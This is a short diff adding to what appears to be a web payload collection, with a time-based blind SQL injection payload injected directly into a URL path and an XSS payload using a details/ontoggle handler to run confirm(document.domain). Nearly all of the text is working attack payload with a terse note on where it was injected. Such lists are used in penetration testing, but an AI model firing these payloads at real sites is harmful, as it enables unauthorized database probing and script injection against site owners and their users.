@@ -1,3 +1,10 @@
+
+Inject In Url Its Self Without any Parameter
+
+Payload was Here
+/0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z/
+as This In Url so We Have [Multiple SQL Injection] 
+
 ---------------------------------------------
 xss Payloads:
 <details++on+/ontoggle%3d1%5econfirm(document.domain)+open//
